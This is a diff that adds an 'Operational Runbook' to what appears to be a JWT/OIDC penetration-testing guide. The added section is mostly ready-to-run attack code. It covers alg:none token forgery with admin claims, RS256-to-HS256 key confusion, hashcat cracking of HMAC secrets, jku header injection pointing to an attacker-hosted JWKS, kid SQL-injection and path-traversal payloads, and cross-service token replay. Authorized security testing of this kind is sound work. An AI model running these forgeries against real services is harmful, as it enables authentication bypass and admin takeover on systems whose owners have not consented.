@@ -107,6 +107,151 @@ JWT/OIDC failures often enable token forgery, token confusion, cross-service acc
 - Host header poisoning → OIDC redirect_uri poisoning → code capture
 - IDOR in sessions/impersonation endpoints → mint tokens for other users
 
+## Operational Runbook
+
+Once a JWT is captured (typically from an `Authorization: Bearer <token>` header), this is the canonical attack flow. Tools: [`jwt_tool.py`](https://github.com/ticarpi/jwt_tool), `python-jose`, plain `python3 -c`, and `hashcat -m 16500` for offline crack.
+
+### Step 1 — decode + classify
+
+```bash
+# Decode header + claims (no verification — just base64 decode)
+TOKEN='eyJhbGciOi...'
+python3 -c "
+import base64, json, sys
+hdr, payload, sig = sys.argv[1].split('.')
+def d(s): return json.loads(base64.urlsafe_b64decode(s + '=='*(-len(s)%4)))
+print('HEADER:', json.dumps(d(hdr), indent=2))
+print('CLAIMS:', json.dumps(d(payload), indent=2))
+" "$TOKEN"
+```
+
+Note: `alg`, `typ`, `kid`, `iss`, `aud`, `sub`, `exp`, `iat`. Each is a probe target.
+
+### Step 2 — `alg: none` (the classic)
+
+```bash
+# Construct a forged token with alg=none and an elevated claim
+python3 << 'PYEOF'
+import base64, json
+hdr = {"alg":"none","typ":"JWT"}
+claims = {"sub":"admin","role":"admin","iss":"<issuer>","aud":"<aud>","exp":9999999999}
+b = lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
+print(f"{b(hdr)}.{b(claims)}.")  # trailing dot, empty signature
+PYEOF
+
+# Replay against the target
+curl -s '<TARGET>/api/admin' -H "Authorization: Bearer <forged-token>"
+```
+
+If response is 2xx → server accepts unsigned tokens. **Critical**.
+
+### Step 3 — algorithm confusion (RS256 → HS256)
+
+The server expects an RSA-signed token but is tricked into using the public key as an HMAC secret:
+
+```bash
+# 1. Fetch the public key
+curl -s '<TARGET>/.well-known/jwks.json' > /tmp/jwks.json
+PUB=$(jq -r '.keys[0].n' /tmp/jwks.json)
+
+# 2. Build the public key in PEM format (jwt_tool handles this)
+jwt_tool.py "$TOKEN" -X k -pk /tmp/pubkey.pem
+
+# Or manually with python-jose
+python3 << 'PYEOF'
+from jose import jwt
+pem = open('/tmp/pubkey.pem').read()
+forged = jwt.encode(
+    {"sub":"admin","role":"admin","iss":"<issuer>","aud":"<aud>","exp":9999999999},
+    pem, algorithm='HS256',
+)
+print(forged)
+PYEOF
+```
+
+### Step 4 — weak HMAC secret (offline crack)
+
+If `alg=HS256` and the server uses a guessable secret:
+
+```bash
+# Convert token to hashcat format
+echo -n "<header>.<payload>" > /tmp/jwt_msg
+# Extract signature bytes — hashcat mode 16500 takes the whole token
+echo "$TOKEN" > /tmp/jwt.txt
+
+hashcat -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
+```
+
+A cracked secret means you can mint any token. **Critical** finding.
+
+### Step 5 — `jku` / `jwk` / `x5u` header injection
+
+Point the server at an attacker-controlled JWKS:
+
+```bash
+# Host a JWKS file on an attacker server
+cat > /tmp/attacker_jwks.json <<'JSON'
+{"keys": [{"kty":"RSA","kid":"attacker","use":"sig","n":"<your-pubkey-modulus>","e":"AQAB"}]}
+JSON
+
+# Forge a token whose header points to your JWKS
+python3 << 'PYEOF'
+import jwt
+priv = open('/tmp/attacker.priv').read()
+token = jwt.encode(
+    {"sub":"admin","role":"admin","exp":9999999999},
+    priv, algorithm='RS256',
+    headers={"jku":"https://attacker.example/jwks.json","kid":"attacker"},
+)
+print(token)
+PYEOF
+
+# Replay; if server fetches the JWKS and validates the token → bypass
+```
+
+### Step 6 — claim mutation (audit logging may reveal blind acceptance)
+
+Try changing claims with valid signature still intact — sometimes the server doesn't actually check `exp`, `nbf`, `aud`, `iss`:
+
+```bash
+# Forge: bump exp far into the future
+# Bonus: try invalid signature — does server accept anyway?
+jwt_tool.py "$TOKEN" -T  # tampering mode
+
+# Specific common bugs to check:
+# - exp far in the past: server should reject; if it accepts → no exp check
+# - aud=https://different-service: should reject; if accepts → no aud check
+# - iss=https://attacker: should reject; if accepts → no iss check
+# - kid set to ../../etc/passwd or SQLi payload: probes for kid path-traversal / SQLi
+```
+
+### Step 7 — `kid` SQLi / path traversal
+
+`kid` is sometimes used as a database lookup or file path:
+
+```bash
+# SQLi in kid
+jwt_tool.py "$TOKEN" -I -hc kid -hv "x' UNION SELECT 'attacker_secret'--"
+
+# Path traversal in kid
+jwt_tool.py "$TOKEN" -I -hc kid -hv "../../../../dev/null"
+# An empty/null key may allow signing with empty string
+```
+
+### Step 8 — replay across services
+
+Even with a valid signature, the token may be accepted by services it wasn't issued for:
+
+```bash
+# Capture token issued for service A; replay against service B
+curl -s '<SERVICE_B>/api/admin' -H "Authorization: Bearer $SERVICE_A_TOKEN"
+
+# Many APIs only check signature, not aud → cross-service replay
+```
+
+Document: which `aud` was issued, which services accepted, which rejected.
+
 ## Testing Methodology
 
 1. **Inventory issuers/consumers** - Identity providers, API gateways, services, mobile/web clients
